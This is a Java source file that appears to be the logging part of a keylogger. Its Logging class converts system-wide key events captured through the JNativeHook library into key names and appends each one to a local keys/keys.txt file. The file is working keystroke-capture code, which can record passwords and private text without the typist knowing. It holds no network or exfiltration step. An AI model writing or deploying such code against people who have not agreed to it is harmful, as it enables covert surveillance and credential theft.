package org.apollyon.capture;

import org.jnativehook.keyboard.NativeKeyEvent;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.Paths;
import java.nio.file.StandardOpenOption;
import java.util.List;


public class Logging {

    public static final String LOGS_DIR = "keys/";

    private static final Path file = Paths.get(LOGS_DIR + "keys.txt");

    private static final Logger logger = LoggerFactory.getLogger(Logging.class);

    public Logging() {
        try {
            Path logsDir = Paths.get(LOGS_DIR);
            if (!Files.exists(logsDir)) {
                Files.createDirectories(logsDir);
            }

            if (!Files.exists(file)) {
                Files.createFile(file);
            }
        } catch (Exception e) {
            throw new RuntimeException("Error creating log file", e);
        }
    }

    public void logKeyPressed(int keyCode) {
        String keyText = NativeKeyEvent.getKeyText(keyCode);

        try {
            List<String> lines = Files.readAllLines(file);
            lines.add(keyText);
            Files.write(file, lines, StandardOpenOption.WRITE);
        } catch (Exception e) {
            logger.error("Error writing to log file", e);
        }
    }
}
